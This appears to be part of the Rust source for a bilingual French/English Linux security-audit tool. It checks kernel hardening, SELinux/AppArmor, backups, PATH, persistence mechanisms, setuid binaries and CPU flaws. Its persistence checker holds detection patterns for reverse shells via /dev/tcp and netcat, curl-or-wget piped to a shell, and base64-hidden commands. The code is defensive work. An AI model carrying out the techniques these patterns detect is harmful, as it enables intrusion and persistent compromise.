            .or_else(|_| std::fs::read_to_string(SYSCTL_ANCIEN))
            .unwrap_or_default(),
        &faibles
            .iter()
            .map(|(c, _, m, _)| (c.replace('/', "."), *m))
            .collect::<Vec<_>>(),
    )
    .replace('\n', "\\n");
    alerte(
        "Noyau durci",
        niveau,
        trf!("Réglages faibles : {}.", "Weak settings: {}.", liste.join(", ")),
    )
    .corriger(
        tr!(
            "Appliquer les valeurs sûres (fichier /etc/sysctl.d/99-sentinel.conf, gardé au redémarrage)",
            "Apply the safe values (file /etc/sysctl.d/99-sentinel.conf, kept after restart)"
        ),
        &[
            &format!("printf '{lignes}' | sudo tee {SYSCTL_SENTINEL} >/dev/null"),
            &format!("sudo rm -f {SYSCTL_ANCIEN}"),
            "sudo sysctl --system >/dev/null",
        ],
    )
}

/// Contenu de 99-sentinel.conf : les réglages déjà présents, mis à jour ou complétés par les nouveaux.
fn fusion_sysctl(existant: &str, nouveaux: &[(String, i64)]) -> String {
    let mut reglages: Vec<(String, String)> = existant
        .lines()
        .filter_map(|l| {
            let (k, v) = l.split_once('=')?;
            let (k, v) = (k.trim(), v.trim());
            // Le contenu repasse par printf dans le shell : seuls des caractères sans effet y sont gardés.
            let sur = |s: &str| !s.is_empty() && s.chars().all(|c| c.is_ascii_alphanumeric() || " ._-/".contains(c));
            (sur(k) && sur(v)).then(|| (k.to_string(), v.to_string()))
        })
        .collect();
    for (cle, valeur) in nouveaux {
        match reglages.iter_mut().find(|(k, _)| k == cle) {
            Some(r) => r.1 = valeur.to_string(),
            None => reglages.push((cle.clone(), valeur.to_string())),
        }
    }
    reglages.iter().fold(String::new(), |mut texte, (k, v)| {
        let _ = writeln!(texte, "{k} = {v}");
        texte
    })
}

/// Module de sécurité obligatoire (AppArmor, SELinux) : actif par défaut sur Ubuntu, Debian et Fedora.
fn module_securite() -> Constat {
    let lsm = std::fs::read_to_string("/sys/kernel/security/lsm").unwrap_or_default();
    if lsm.contains("selinux") {
        return match std::fs::read_to_string("/sys/fs/selinux/enforce").map(|v| v.trim().to_string()) {
            Ok(v) if v == "1" => ok(
                "AppArmor/SELinux",
                tr!("SELinux actif (mode strict).", "SELinux on (enforcing mode)."),
            ),
            Ok(_) => alerte(
                "AppArmor/SELinux",
                Niveau::Moyen,
                tr!(
                    "SELinux est en mode permissif : il signale mais ne bloque rien.",
                    "SELinux is in permissive mode: it reports but blocks nothing."
                ),
            )
            .corriger(
                tr!("Repasser SELinux en mode strict", "Put SELinux back in enforcing mode"),
                &["sudo setenforce 1"],
            ),
            Err(_) => impossible(
                "AppArmor/SELinux",
                tr!("état de SELinux illisible", "SELinux state unreadable"),
            ),
        };
    }
    if lsm.contains("apparmor") {
        return ok("AppArmor/SELinux", tr!("AppArmor actif.", "AppArmor on."));
    }
    // Arch ne l'active pas par défaut : simple information. Ailleurs, c'est qu'on l'a coupé.
    let attendu = matches!(Paquets::detecter(), Some(Paquets::Apt | Paquets::Dnf | Paquets::Zypper));
    if lsm.is_empty() {
        impossible(
            "AppArmor/SELinux",
            tr!(
                "liste des modules de sécurité illisible",
                "security module list unreadable"
            ),
        )
    } else if attendu {
        alerte(
            "AppArmor/SELinux",
            Niveau::Moyen,
            tr!(
                "Ni AppArmor ni SELinux n'est actif, alors que ta distribution l'active normalement.",
                "Neither AppArmor nor SELinux is on, although your distribution normally turns it on."
            ),
        )
        .manuel(
            tr!(
                "Vérifier pourquoi il a été désactivé (paramètres de démarrage du noyau, paquet retiré)",
                "Check why it was turned off (kernel boot parameters, package removed)"
            ),
            &[],
        )
    } else {
        alerte(
            "AppArmor/SELinux",
            Niveau::Info,
            tr!(
                "Ni AppArmor ni SELinux (normal sur Arch, où il faut l'activer soi-même).",
                "Neither AppArmor nor SELinux (normal on Arch, where you turn it on yourself)."
            ),
        )
    }
}

/// Minuteries systemd (système et utilisateur) : (nom, dernier passage en µs depuis 1970, service lancé, utilisateur ?).
fn minuteries() -> Vec<(String, u64, String, bool)> {
    let mut toutes = Vec::new();
    for utilisateur in [false, true] {
        let mut args = vec!["list-timers", "--all", "--output=json"];
        if utilisateur {
            args.insert(0, "--user");
        }
        let Some(json) = sortie("systemctl", &args) else {
            continue;
        };
        let Ok(serde_json::Value::Array(liste)) = serde_json::from_str::<serde_json::Value>(&json) else {
            continue;
        };
        for t in liste {
            let nom = t["unit"].as_str().unwrap_or_default().to_string();
            let service = t["activates"].as_str().unwrap_or_default().to_string();
            toutes.push((nom, t["last"].as_u64().unwrap_or(0), service, utilisateur));
        }
    }
    toutes
}

/// Une minuterie de sauvegarde ? `Some(true)` = vraie sauvegarde, `Some(false)` = instantanés sur le même disque.
fn type_sauvegarde(nom: &str) -> Option<bool> {
    let n = nom.to_ascii_lowercase();
    if [
        "restic",
        "borg",
        "backup",
        "sauvegarde",
        "kopia",
        "duplicity",
        "rsnapshot",
        "timeshift",
        "deja-dup",
        "btrbk",
    ]
    .iter()
    .any(|m| n.contains(m))
    {
        Some(true)
    } else if n.contains("snapper") && n.contains("timeline") {
        Some(false)
    } else {
        None
    }
}

/// La meilleure défense contre une panne de disque, un vol ou un rançongiciel.
fn sauvegardes() -> Constat {
    if !systemd() {
        return impossible("Sauvegardes", tr!("systemd absent", "systemd missing"));
    }
    let maintenant = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map_or(0, |d| u64::try_from(d.as_micros()).unwrap_or(u64::MAX));
    let jours = |dernier: u64| (maintenant.saturating_sub(dernier)) / 86_400_000_000;
    let toutes = minuteries();
    let vraies: Vec<_> = toutes.iter().filter(|t| type_sauvegarde(&t.0) == Some(true)).collect();
    let instantanes = toutes.iter().any(|t| type_sauvegarde(&t.0) == Some(false));
    let Some(meilleure) = vraies.iter().filter(|t| t.1 > 0).max_by_key(|t| t.1) else {
        return if let Some(t) = vraies.first() {
            alerte(
                "Sauvegardes",
                Niveau::Moyen,
                trf!(
                    "La sauvegarde « {} » n'a encore jamais tourné.",
                    "The “{}” backup has never run yet.",
                    t.0
                ),
            )
        } else if instantanes {
            alerte(
                "Sauvegardes",
                Niveau::Info,
                tr!("Seulement des instantanés snapper, sur le même disque : ils ne protègent ni d'une panne de disque ni d'un vol.", "Only snapper snapshots, on the same disk: they protect neither against a disk failure nor against theft."),
            )
            .manuel(tr!("Ajouter une vraie sauvegarde vers un autre disque ou en ligne (restic, Borg, Timeshift…)", "Add a real backup to another disk or online (restic, Borg, Timeshift…)"), &[])
        } else {
            alerte("Sauvegardes", Niveau::Moyen, tr!("Aucune sauvegarde automatique détectée.", "No automatic backup detected.")).manuel(
                tr!("Mettre en place une sauvegarde vers un autre disque ou en ligne (restic, Borg, Timeshift, Déjà Dup…)", "Set up a backup to another disk or online (restic, Borg, Timeshift, Déjà Dup…)"),
                &[],
            )
        };
    };
    let (nom, dernier, service, utilisateur) = meilleure;
    let mut args = vec!["show", service.as_str(), "-p", "Result", "--value"];
    if *utilisateur {
        args.insert(0, "--user");
    }
    let resultat = sortie("systemctl", &args).map(|r| r.trim().to_string());
    let age = jours(*dernier);
    let quand = if age == 0 {
        tr!("aujourd'hui", "today").to_string()
    } else {
        trf!("il y a {age} jour(s)", "{age} day(s) ago")
    };
    if resultat.as_deref().is_some_and(|r| r != "success") {
        alerte(
            "Sauvegardes",
            Niveau::Moyen,
            trf!(
                "La dernière sauvegarde « {nom} » ({quand}) a échoué ({}).",
                "The last “{nom}” backup ({quand}) failed ({}).",
                resultat.unwrap_or_default()
            ),
        )
        .manuel(
            tr!("Voir l'erreur", "See the error"),
            &[&format!(
                "journalctl {}-u {service} -n 30",
                if *utilisateur { "--user " } else { "" }
            )],
        )
    } else if age > 7 {
        alerte(
            "Sauvegardes",
            Niveau::Moyen,
            trf!(
                "Dernière sauvegarde « {nom} » {quand} : trop ancienne.",
                "Last “{nom}” backup {quand}: too old."
            ),
        )
    } else {
        ok(
            "Sauvegardes",
            trf!(
                "Sauvegarde automatique « {nom} », dernière {quand}.",
                "Automatic “{nom}” backup, last one {quand}."
            ),
        )
    }
}

/// Dossiers du PATH dangereux : modifiables par tout le monde (sans « sticky bit ») ou relatifs (« . »).
fn path_dangereux(path: &str, droits: impl Fn(&str) -> Option<u32>) -> Vec<String> {
    path.split(':')
        .filter(|d| d.is_empty() || !d.starts_with('/') || droits(d).is_some_and(|m| m & 0o002 != 0 && m & 0o1000 == 0))
        .map(|d| {
            if d.is_empty() {
                "(vide = dossier courant)".to_string()
            } else {
                d.to_string()
            }
        })
        .collect()
}

/// Ligne de configuration vide ou en commentaire (shell, systemd, .desktop : « # » ; Lua : « -- » ; « ; »).
fn commentaire(ligne: &str) -> bool {
    let l = ligne.trim_start();
    l.is_empty() || l.starts_with('#') || l.starts_with("--") || l.starts_with(';') || l.starts_with("//")
}

/// Dossiers cachés du dossier personnel où vivent normalement des programmes.
const DOSSIERS_CACHES_NORMAUX: [&str; 10] = [
    ".local",
    ".config",
    ".cargo",
    ".rustup",
    ".nix-profile",
    ".npm-global",
    ".bun",
    ".deno",
    ".dotnet",
    ".steam",
];

/// Pourquoi cette commande lancée automatiquement ressemble à une porte dérobée, ou `None`. `lancement` : la ligne
/// est une commande lancée (service, démarrage de session), pas un fichier de configuration du shell, où « /tmp »
/// apparaît sans rien lancer. Seules des formes précises sont retenues, pour ne pas alerter sur chaque script maison.
fn commande_suspecte(commande: &str, lancement: bool) -> Option<&'static str> {
    let mots: Vec<&str> = commande.split_whitespace().collect();
    let a = |m: &str| mots.iter().any(|x| x.trim_matches(|c| c == '"' || c == '\'') == m);
    if commande.contains("/dev/tcp/") || commande.contains("/dev/udp/") {
        return Some(tr!(
            "connexion réseau ouverte par le shell (shell inversé)",
            "network connection opened by the shell (reverse shell)"
        ));
    }
    if (a("nc") || a("ncat") || a("netcat")) && (a("-e") || a("-c")) {
        return Some(tr!(
            "netcat qui donne un shell (shell inversé)",
            "netcat giving a shell (reverse shell)"
        ));
    }
    if (commande.contains("curl") || commande.contains("wget"))
        && commande.split('|').skip(1).any(|suite| {
            let prog = suite.split_whitespace().next().unwrap_or("");
            ["sh", "bash", "zsh", "dash", "python", "python3", "perl"].contains(&prog.rsplit('/').next().unwrap_or(""))
        })
    {
        return Some(tr!(
            "télécharge un script et l'exécute aussitôt",
            "downloads a script and runs it right away"
        ));
    }
    if commande.contains("base64 -d") || commande.contains("base64 --decode") {
        return Some(tr!("commande cachée en base64", "command hidden in base64"));
    }
    if !lancement {
        return None;
    }
    // Programme lancé : premier mot, sans les préfixes de systemd (« -/usr/bin/x », « @ », « + », « ! »).
    let programme = mots
        .first()?
        .trim_matches(|c| c == '"' || c == '\'')
        .trim_start_matches(['-', '@', '+', '!', ':']);
    if ["/tmp/", "/var/tmp/", "/dev/shm/"]
        .iter()
        .any(|d| programme.starts_with(d))
    {
        return Some(tr!(
            "programme lancé depuis un dossier temporaire",
            "program started from a temporary folder"
        ));
    }
    let maison = home();
    let relatif = programme
        .strip_prefix("~/")
        .or_else(|| programme.strip_prefix("$HOME/"))
        .or_else(|| programme.strip_prefix("%h/"))
        .or_else(|| {
            (!maison.is_empty())
                .then(|| programme.strip_prefix(&format!("{maison}/")))
                .flatten()
        });
    if let Some(r) = relatif {
        let premier = r.split('/').next().unwrap_or("");
        if premier.starts_with('.') && r.contains('/') && !DOSSIERS_CACHES_NORMAUX.contains(&premier) {
            return Some(tr!(
                "programme rangé dans un dossier caché du dossier personnel",
                "program stored in a hidden folder of the home folder"
            ));
        }
    }
    None
}

/// Commande lancée par une ligne de démarrage : « ExecStart=… » (systemd), « Exec=… » (.desktop),
/// « exec-once = … » (Hyprland), « o.exec_on_start("…") » (Omarchy en Lua). `None` si la ligne ne lance rien.
fn commande_lancee(ligne: &str) -> Option<String> {
    let l = ligne.trim();
    if commentaire(l) {
        return None;
    }
    if let Some((cle, valeur)) = l.split_once('=') {
        let cle = cle.trim();
        if cle.starts_with("Exec") || ["exec-once", "exec", "exec-shutdown"].contains(&cle) {
            return Some(valeur.trim().to_string());
        }
    }
    if ["exec_on_start", "launch_on_start", "exec_once", "exec-once"]
        .iter()
        .any(|m| l.contains(m))
    {
        let debut = l.find(['"', '\''])?;
        let fin = l.rfind(['"', '\''])?;
        return (fin > debut).then(|| l[debut + 1..fin].to_string());
    }
    None
}

/// Ligne qui précharge une bibliothèque dans tous les programmes (LD_PRELOAD, LD_AUDIT) ; « unset » la retire.
fn definit_prechargement(ligne: &str) -> bool {
    !commentaire(ligne)
        && (ligne.contains("LD_PRELOAD") || ligne.contains("LD_AUDIT"))
        && !ligne.trim_start().starts_with("unset")
}

/// Fichiers d'un dossier (et de ses sous-dossiers « *.d » de systemd), sans suivre les liens d'activation.
fn fichiers_de(dossier: &Path, extensions: &[&str]) -> Vec<std::path::PathBuf> {
    let mut trouve = Vec::new();
    for e in std::fs::read_dir(dossier).into_iter().flatten().flatten() {
        let p = e.path();
        let Ok(t) = e.file_type() else { continue };
        if t.is_dir() && (p.extension().is_some_and(|x| x == "d") || dossier.ends_with("hypr")) {
            trouve.extend(fichiers_de(&p, extensions));
        } else if t.is_file() && p.extension().is_some_and(|x| extensions.iter().any(|e| x == *e)) {
            trouve.push(p);
        }
    }
    trouve
}

/// Lancements automatiques détournés : bibliothèque préchargée dans tous les programmes, services et démarrage
/// de session qui lancent un shell inversé ou un programme caché, services système ajoutés à la main.
fn persistance() -> Vec<Constat> {
    const CAT: &str = "Persistance";
    let h = std::path::PathBuf::from(home());
    let gestion = Paquets::detecter();
    let mut critiques = Vec::new();
    let mut suspects = Vec::new();

    // /etc/ld.so.preload : chaque bibliothèque listée est chargée dans TOUS les programmes, root compris.
    // Technique classique des rootkits ; presque aucun système normal n'en a.
    if let Ok(texte) = std::fs::read_to_string("/etc/ld.so.preload") {
        for lib in texte
            .lines()
            .filter(|l| !commentaire(l))
            .flat_map(str::split_whitespace)
        {
            let connue = gestion.is_some_and(|g| g.possede(Path::new(lib)));
            if connue {
                suspects.push(trf!(
                    "/etc/ld.so.preload charge {lib} dans tous les programmes",
                    "/etc/ld.so.preload loads {lib} into every program"
                ));
            } else {
                critiques.push(trf!(
                    "/etc/ld.so.preload charge {lib} (hors paquet) dans tous les programmes",
                    "/etc/ld.so.preload loads {lib} (not from a package) into every program"
                ));
            }
        }
    }
    for var in ["LD_PRELOAD", "LD_AUDIT"] {
        if let Some(v) = std::env::var_os(var).filter(|v| !v.is_empty()) {
            suspects.push(trf!(
                "{var}={} est défini pour cette session",
                "{var}={} is set for this session",
                v.to_string_lossy()
            ));
        }
    }

    let mut configuration: Vec<std::path::PathBuf> = [
        "/etc/environment",
        "/etc/profile",
        "/etc/bash.bashrc",
        "/etc/zsh/zshenv",
        "/etc/zsh/zprofile",
    ]
    .iter()
    .map(std::path::PathBuf::from)
    .collect();
    configuration.extend(fichiers_de(Path::new("/etc/profile.d"), &["sh", "zsh"]));
    configuration.extend(fichiers_de(Path::new("/etc/environment.d"), &["conf"]));
    configuration.extend(
        [
            ".profile",
            ".bash_profile",
            ".bashrc",
            ".zshrc",
            ".zshenv",
            ".zprofile",
            ".xprofile",
        ]
        .iter()
        .map(|f| h.join(f)),
    );
    configuration.extend(fichiers_de(&h.join(".config/environment.d"), &["conf"]));
    configuration.extend(fichiers_de(&h.join(".config/uwsm"), &["sh", "conf"]));
    for f in std::fs::read_dir(h.join(".config/uwsm"))
        .into_iter()
        .flatten()
        .flatten()
    {
        if f.file_name().to_string_lossy().starts_with("env") && f.path().is_file() {
            configuration.push(f.path());
        }
    }

    // Fichiers dont des lignes lancent des programmes.
    let mut demarrage = fichiers_de(
        Path::new("/etc/systemd/system"),
        &["service", "timer", "socket", "path", "conf"],
    );
    demarrage.retain(|p| !p.is_symlink());
    demarrage.extend(fichiers_de(
        &h.join(".config/systemd/user"),
        &["service", "timer", "socket", "path", "conf"],
    ));
    demarrage.extend(fichiers_de(&h.join(".config/autostart"), &["desktop"]));
    demarrage.extend(fichiers_de(Path::new("/etc/xdg/autostart"), &["desktop"]));
    let hypr = fichiers_de(&h.join(".config/hypr"), &["conf", "lua"]);
    demarrage.extend(hypr.iter().cloned());
    configuration.extend(hypr);

    let court = |p: &Path| {
        p.strip_prefix(&h)
            .map_or_else(|_| p.display().to_string(), |r| format!("~/{}", r.display()))
    };
    for f in &configuration {
        let Ok(texte) = std::fs::read_to_string(f) else {
            continue;
        };
        for (n, l) in texte.lines().enumerate() {
            if definit_prechargement(l) {
                suspects.push(trf!(
                    "{}:{} précharge une bibliothèque (LD_PRELOAD)",
                    "{}:{} preloads a library (LD_PRELOAD)",
                    court(f),
                    n + 1
                ));
            } else if !commentaire(l)
                && !demarrage.contains(f)
                && let Some(raison) = commande_suspecte(l, false)
            {
                suspects.push(trf!("{}:{} : {raison}", "{}:{}: {raison}", court(f), n + 1));
            }
        }
    }
    for f in &demarrage {
        let Ok(texte) = std::fs::read_to_string(f) else {
            continue;
        };
        for (n, l) in texte.lines().enumerate() {
            if let Some(raison) = commande_lancee(l).and_then(|c| commande_suspecte(&c, true)) {
                suspects.push(trf!("{}:{} : {raison}", "{}:{}: {raison}", court(f), n + 1));
            }
        }
    }
    // crontab de l'utilisateur et du système : chaque ligne est une commande.
    let mut cron: Vec<(String, String)> = sortie("crontab", &["-l"])
        .unwrap_or_default()
        .lines()
        .map(|l| ("crontab".to_string(), l.to_string()))
        .collect();
    let mut fichiers_cron = vec![std::path::PathBuf::from("/etc/crontab")];
    fichiers_cron.extend(
        std::fs::read_dir("/etc/cron.d")
            .into_iter()
            .flatten()
            .flatten()
            .map(|e| e.path()),
    );
    for f in fichiers_cron {
        for l in std::fs::read_to_string(&f).unwrap_or_default().lines() {
            cron.push((f.display().to_string(), l.to_string()));
        }
    }
    for (source, l) in cron.iter().filter(|(_, l)| !commentaire(l)) {
        if let Some(raison) = commande_suspecte(l, false) {
            suspects.push(trf!("{source} : {raison}", "{source}: {raison}"));
        }
    }

    let mut constats = Vec::new();
    suspects.sort();
    suspects.dedup();
    if critiques.is_empty() && suspects.is_empty() {
        constats.push(ok(
            CAT,
            tr!(
                "Aucun lancement automatique suspect (préchargement, services, démarrage de session, cron).",
                "No suspicious autostart (preloading, services, session startup, cron)."
            ),
        ));
    } else {
        let niveau = if critiques.is_empty() {
            Niveau::Eleve
        } else {
            Niveau::Critique
        };
        let mut liste = critiques;
        liste.extend(suspects);
        let reste = liste.len().saturating_sub(6);
        liste.truncate(6);
        let mut message = trf!(
            "Lancement automatique suspect : {}",
            "Suspicious autostart: {}",
            liste.join(" ; ")
        );
        if reste > 0 {
            let _ = trw!(message, " ; et {reste} autre(s)", "; and {reste} more");
        }
        message.push('.');
        constats.push(alerte(CAT, niveau, message).manuel(
            tr!("Ne rien lancer : lire chaque ligne signalée et supprimer celles que tu n'as pas ajoutées, puis lancer l'antivirus", "Do not run anything: read each reported line and delete the ones you did not add, then run the antivirus"),
            &[],
        ));
    }

    // Services système ajoutés à la main : souvent les tiens (scripts maison), parfois une persistance root.
    // On les nomme pour que tu les reconnaisses, sans baisser la note.
    if let Some(gestion) = gestion {
        let mut maison: Vec<String> = fichiers_de(Path::new("/etc/systemd/system"), &["service", "timer"])
            .into_iter()
            .filter(|p| p.parent() == Some(Path::new("/etc/systemd/system")) && !p.is_symlink())
            .filter(|p| !gestion.possede(p))
            .filter_map(|p| p.file_name().map(|n| n.to_string_lossy().into_owned()))
            .collect();
        maison.sort();
        if !maison.is_empty() {
            let premier = maison[0].clone();
            constats.push(
                alerte(
                    CAT,
                    Niveau::Info,
                    trf!(
                        "{} service(s) système ajouté(s) à la main, hors paquet : {}. À reconnaître.",
                        "{} system service(s) added by hand, not from a package: {}. Check that you recognize them.",
                        maison.len(),
                        maison.join(", ")
                    ),
                )
                .manuel(
                    tr!(
                        "Si tu n'en reconnais pas un, lis ce qu'il lance avant de le désactiver",
                        "If you do not recognize one, read what it starts before turning it off"
                    ),
                    &[&format!("systemctl cat {premier}")],
                ),
            );
        }
    }
    constats
}

/// Fichiers listés par « getcap -r » : « /usr/bin/ping cap_net_raw=ep » (ancien format : « /usr/bin/ping = cap_net_raw+ep »).
fn fichiers_capacites(texte: &str) -> Vec<std::path::PathBuf> {
    texte
        .lines()
        .filter_map(|l| l.split_once(" = ").or_else(|| l.rsplit_once(' ')))
        .filter(|(f, caps)| f.starts_with('/') && caps.contains("cap_"))
        .map(|(f, _)| std::path::PathBuf::from(f))
        .collect()
}

/// Programmes privilégiés (setuid, setgid, capacités : lancés avec des droits que l'utilisateur n'a pas) là où il ne
/// devrait pas y en avoir, qui n'appartiennent à aucun paquet ou qui ont changé depuis leur installation ; et PATH piégeable.
fn fichiers_suspects() -> Vec<Constat> {
    use std::os::unix::fs::PermissionsExt;
    fn parcourir(d: &Path, profondeur: u32, trouve: &mut Vec<std::path::PathBuf>, test: &dyn Fn(&Path) -> bool) {
        for e in std::fs::read_dir(d).into_iter().flatten().flatten() {
            let p = e.path();
            if e.file_type().is_ok_and(|t| t.is_dir()) {
                if profondeur > 0 {
                    parcourir(&p, profondeur - 1, trouve, test);
                }
            } else if test(&p) {
                trouve.push(p);
            }
        }
    }
    use std::os::unix::fs::MetadataExt;
    let mut constats = Vec::new();
    // Propriétaire du processus, lu sur /proc/self (sans dépendance à la libc).
    let moi = std::fs::metadata("/proc/self").map_or(u32::MAX, |m| m.uid());
    // Dans un dossier temporaire ou personnel, un setuid à soi ne donne aucun droit de plus ; un setuid à un autre
    // compte (root) ou un setgid du groupe root, si.
    let dangereux_hors_systeme = |p: &Path| {
        p.symlink_metadata().is_ok_and(|m| {
            m.is_file()
                && ((m.permissions().mode() & 0o4000 != 0 && m.uid() != moi)
                    || (m.permissions().mode() & 0o2000 != 0 && m.gid() == 0))
        })
    };
    let privilegie = |p: &Path| {
        p.symlink_metadata()
            .is_ok_and(|m| m.is_file() && m.permissions().mode() & 0o6000 != 0)
    };
    let mut anormaux = Vec::new();
    for (d, prof) in [("/tmp", 3), ("/var/tmp", 3), ("/dev/shm", 3), (&home() as &str, 2)] {
        parcourir(Path::new(d), prof, &mut anormaux, &dangereux_hors_systeme);
    }
    // Dans les dossiers système : chaque setuid ou setgid doit venir d'un paquet, et être intact.
    let mut systeme = Vec::new();
    for (d, prof) in [
        ("/usr/bin", 0),
        ("/usr/sbin", 0),
        ("/usr/local/bin", 0),
        ("/usr/local/sbin", 0),
        ("/usr/lib", 2),
        ("/usr/libexec", 2),
        ("/opt", 3),
    ] {
        parcourir(Path::new(d), prof, &mut systeme, &privilegie);
    }
    // Capacités (setcap) : droits root partiels, invisibles dans « ls -l ». Poser une capacité demande root.
    let capacites = sortie(
        "getcap",
        &[
            "-r",
            "/usr/bin",
            "/usr/sbin",
            "/usr/local",
            "/usr/lib",
            "/usr/libexec",
            "/opt",
            "/tmp",
            "/var/tmp",
            "/dev/shm",
        ],
    )
    .map(|s| fichiers_capacites(&s));
    for p in capacites.iter().flatten() {
        if ["/tmp/", "/var/tmp/", "/dev/shm/"].iter().any(|d| p.starts_with(d)) {
            anormaux.push(p.clone());
        } else if !systeme.contains(p) {
            systeme.push(p.clone());
        }
    }
    // /usr/sbin est un lien vers /usr/bin sur Arch : chemin réel (celui que connaît le paquet), sans doublon.
    let mut systeme: Vec<std::path::PathBuf> = systeme
        .into_iter()
        .map(|p| std::fs::canonicalize(&p).unwrap_or(p))
        .collect();
    systeme.sort();
    systeme.dedup();
    let gestion = Paquets::detecter();
    let mut par_paquet: std::collections::BTreeMap<String, Vec<std::path::PathBuf>> = std::collections::BTreeMap::new();
    if let Some(gestion) = gestion {
        for p in &systeme {
            match gestion.proprietaire(p) {
                Some(paquet) => par_paquet.entry(paquet).or_default().push(p.clone()),
                None => anormaux.push(p.clone()),
            }
        }
    }
    let (mut modifies, mut non_verifies) = (Vec::new(), 0);
    if let Some(gestion) = gestion {
        for (paquet, fichiers) in &par_paquet {
            for (f, etat) in fichiers.iter().zip(gestion.modifies(paquet, fichiers)) {
                match etat {
                    Some(true) => modifies.push((f.display().to_string(), paquet.clone())),
                    Some(false) => {}
                    None => non_verifies += 1,
                }
            }
        }
    }
    if !modifies.is_empty() {
        let liste: Vec<String> = modifies
            .iter()
            .map(|(f, p)| trf!("{f} (paquet {p})", "{f} (package {p})"))
            .collect();
        let mut paquets: Vec<&str> = modifies.iter().map(|(_, p)| p.as_str()).collect();
        paquets.dedup();
        let reinstaller = gestion.map(|g| g.reinstaller(&paquets.join(" "))).unwrap_or_default();
        constats.push(
            alerte(
                "Fichiers suspects",
                Niveau::Critique,
                trf!(
                    "Programme(s) privilégié(s) modifié(s) depuis leur installation : {}. Signe possible d'une porte dérobée.", "Privileged program(s) modified since install: {}. Possible sign of a backdoor.",
                    liste.join(", ")
                ),
            )
            .manuel(
                tr!("Ne pas le lancer. Remettre l'original depuis les dépôts, puis lancer l'antivirus et changer tes mots de passe", "Do not run it. Restore the original from the repositories, then run the antivirus and change your passwords"),
                &[&reinstaller],
            ),
        );
    }
    if !anormaux.is_empty() {
        let liste: Vec<String> = anormaux.iter().take(10).map(|p| p.display().to_string()).collect();
        constats.push(
            alerte(
                "Fichiers suspects",
                Niveau::Eleve,
                trf!(
                    "Programme(s) setuid, setgid ou à capacités hors paquet ou dans un dossier temporaire : {}.", "Setuid, setgid or capability program(s) not from a package or in a temporary folder: {}.",
                    liste.join(", ")
                ),
            )
            .manuel(
                tr!("Ces programmes peuvent donner des droits root : vérifier d'où ils viennent avant toute chose (ne pas les lancer)", "These programs can give root rights: check where they come from before anything else (do not run them)"),
                &[&format!("ls -l {}", liste.join(" ")), &format!("getcap {}", liste.join(" "))],
            ),
        );
    }
    if modifies.is_empty() && anormaux.is_empty() {
        let n = systeme.len();
        let mut message = match (gestion, non_verifies) {
            (None, _) => trf!(
                "Aucun programme privilégié dans les dossiers temporaires ; les {n} du système n'ont pas pu être \
                 rapprochés d'un paquet (gestionnaire de paquets non reconnu).",
                "No privileged program in temporary folders; the {n} system ones could not be \
                 matched to a package (package manager not recognized)."
            ),
            (Some(_), 0) => trf!(
                "Aucun programme privilégié inhabituel : {n} setuid, setgid ou à capacités, tous d'un paquet et intacts.",
                "No unusual privileged program: {n} setuid, setgid or capability programs, all from a package and intact."
            ),
            (Some(_), k) => trf!(
                "Aucun programme privilégié inhabituel : {n} setuid, setgid ou à capacités, tous d'un paquet ; \
                 {k} illisible(s), donc non comparé(s) à l'original.",
                "No unusual privileged program: {n} setuid, setgid or capability programs, all from a package; \
                 {k} unreadable, so not compared to the original."
            ),
        };
        if capacites.is_none() {
            message.push_str(tr!(
                " Capacités non vérifiées (getcap absent).",
                " Capabilities not checked (getcap missing)."
            ));
        }
        constats.push(ok("Fichiers suspects", message));
    }
    let path = std::env::var("PATH").unwrap_or_default();
    let dangereux = path_dangereux(&path, |d| std::fs::metadata(d).ok().map(|m| m.permissions().mode()));
    if !dangereux.is_empty() {
        constats.push(
            alerte(
                "Fichiers suspects",
                Niveau::Eleve,
                trf!(
                    "PATH piégeable : {} (n'importe qui peut y déposer un faux « ls » ou « sudo »).",
                    "Hijackable PATH: {} (anyone can drop a fake “ls” or “sudo” there).",
                    dangereux.join(", ")
                ),
            )
            .manuel(
                tr!(
                    "Retirer ces dossiers du PATH (~/.bashrc, ~/.profile) ou corriger leurs droits",
                    "Remove these folders from the PATH (~/.bashrc, ~/.profile) or fix their permissions"
                ),
                &[],
            ),
        );
    }
    constats
}

/// Failles du processeur (Spectre, Meltdown…) encore ouvertes, d'après ce que le noyau en dit.
fn failles_vulnerables(etats: &[(String, String)]) -> Vec<String> {
    etats
        .iter()
        .filter(|(_, e)| e.trim_start().starts_with("Vulnerable"))
        .map(|(n, _)| n.clone())
        .collect()
}

fn processeur() -> Constat {
    let Ok(dossier) = std::fs::read_dir("/sys/devices/system/cpu/vulnerabilities") else {
        return impossible(
            "Processeur",
            tr!(
                "état des failles du processeur illisible",
                "processor flaw state unreadable"
            ),
        );
    };
    let etats: Vec<(String, String)> = dossier
        .flatten()
        .filter_map(|f| {
            Some((
                f.file_name().to_string_lossy().into_owned(),
                std::fs::read_to_string(f.path()).ok()?,
            ))
        })
        .collect();
    let failles = failles_vulnerables(&etats);
    if failles.is_empty() {
        return ok(
            "Processeur",
            trf!(
                "Protégé contre les {} failles connues du processeur (Spectre, Meltdown…).",
                "Protected against the {} known processor flaws (Spectre, Meltdown…).",
                etats.len()
            ),
        );
    }
    // Le microcode du fabricant corrige la plupart de ces failles ; le paquet change selon la distribution.
    let amd = std::fs::read_to_string("/proc/cpuinfo").is_ok_and(|c| c.contains("AuthenticAMD"));
    let paquet = match (Paquets::detecter(), amd) {
        (Some(Paquets::Pacman), true) => Some("amd-ucode"),
        (Some(Paquets::Pacman), false) => Some("intel-ucode"),
        (Some(Paquets::Apt), true) => Some("amd64-microcode"),
        (Some(Paquets::Apt), false) => Some("intel-microcode"),
        (Some(Paquets::Dnf), _) => Some("microcode_ctl linux-firmware"),
        (Some(Paquets::Zypper), true) => Some("ucode-amd"),
        (Some(Paquets::Zypper), false) => Some("ucode-intel"),
        (None, _) => None,
    };
    let constat = alerte(
        "Processeur",
        Niveau::Moyen,
        trf!(
            "Processeur vulnérable à : {}. Un programme malveillant pourrait lire la mémoire d'autres programmes.",
            "Processor vulnerable to: {}. A malicious program could read the memory of other programs.",
            failles.join(", ")
        ),
    );
    match (paquet, Paquets::detecter()) {
        (Some(p), Some(g)) => constat.corriger(
            tr!(
                "Installer le microcode du fabricant (effectif après mise à jour du système et redémarrage)",
                "Install the manufacturer's microcode (effective after a system update and a restart)"
            ),
            &[&g.installer(p)],
        ),
        _ => constat.manuel(
            tr!(
                "Installer le microcode du fabricant et mettre le noyau à jour, puis redémarrer",
                "Install the manufacturer's microcode and update the kernel, then restart"
            ),
            &[],
        ),
    }
}

